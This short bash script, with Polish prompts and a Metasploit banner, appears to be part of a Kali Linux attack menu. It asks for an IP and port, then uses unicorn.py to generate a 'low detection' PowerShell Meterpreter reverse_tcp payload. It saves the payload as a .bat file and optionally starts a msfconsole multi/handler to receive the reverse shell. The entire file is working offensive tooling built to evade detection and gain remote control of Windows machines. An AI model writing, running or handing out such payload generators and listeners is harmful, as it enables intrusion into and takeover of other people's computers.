#! /bin/bash
# LOW DETECTION POWERSHELL PAYLOAD 
echo "

 ███▄ ▄███▓▓█████▄▄▄█████▓ ▄▄▄        ██████  ██▓███   ██▓     ▒█████   ██▓▄▄▄█████▓
▓██▒▀█▀ ██▒▓█   ▀▓  ██▒ ▓▒▒████▄    ▒██    ▒ ▓██░  ██▒▓██▒    ▒██▒  ██▒▓██▒▓  ██▒ ▓▒
▓██    ▓██░▒███  ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   ▓██░ ██▓▒▒██░    ▒██░  ██▒▒██▒▒ ▓██░ ▒░
▒██    ▒██ ▒▓█  ▄░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒▒██▄█▓▒ ▒▒██░    ▒██   ██░░██░░ ▓██▓ ░ 
▒██▒   ░██▒░▒████▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒▒██▒ ░  ░░██████▒░ ████▓▒░░██░  ▒██▒ ░ 
░ ▒░   ░  ░░░ ▒░ ░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░▒▓▒░ ░  ░░ ▒░▓  ░░ ▒░▒░▒░ ░▓    ▒ ░░   
░  ░      ░ ░ ░  ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░░▒ ░     ░ ░ ▒  ░  ░ ▒ ▒░  ▒ ░    ░    
░      ░      ░    ░        ░   ▒   ░  ░  ░  ░░         ░ ░   ░ ░ ░ ▒   ▒ ░  ░      
       ░      ░  ░              ░  ░      ░               ░  ░    ░ ░   ░           
                                                                                    
"
echo "Uruchamiam skrypt ..."
cd /home/kali/Desktop/KOZ1OLMENU/unicorn
echo "Podaj adres ip ładunku ..."
read IP
echo "Podaj port ładunku ..."
read PORT
./unicorn.py windows/meterpreter/reverse_tcp $IP $PORT
mv /home/kali/Desktop/KOZ1OLMENU/unicorn/powershell_attack.txt /home/kali/Desktop/powershell_attack.bat
cd /home/kali/Desktop/K0Z1OLMENU
echo "Czy mam uruchomić pakiet metasploit ? (Y/N)"
read ODPOWIEDZ
if [ $ODPOWIEDZ == "Y" ]
then
  echo "Uruchamiam skrypt... "
  sleep 3
  sudo msfconsole -x 'use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp'
  
else
  echo "Kończę działanie skryptu ..."
fi
sudo ./K0Z1OLMENU